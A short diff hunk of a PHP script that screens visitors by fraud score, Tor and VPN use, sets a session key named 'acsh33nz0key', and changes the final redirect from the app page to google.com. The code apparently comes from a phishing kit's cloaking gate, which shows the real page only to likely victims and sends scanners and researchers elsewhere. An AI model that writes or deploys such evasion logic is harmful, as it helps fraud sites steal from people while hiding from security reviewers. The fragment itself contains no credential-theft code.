@@ -39,5 +39,5 @@ if ($fraud_score >= "".$max_fraud_score.""|| $tor == "".$fuck_tor."" || $vpn == 
 }
 $acsh33nz0key = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
 $_SESSION['acsh33nz0key'] = $acsh33nz0key;
-exit(header("Location: app/index"));
+exit(header("Location: https://google.com"));
 ?>
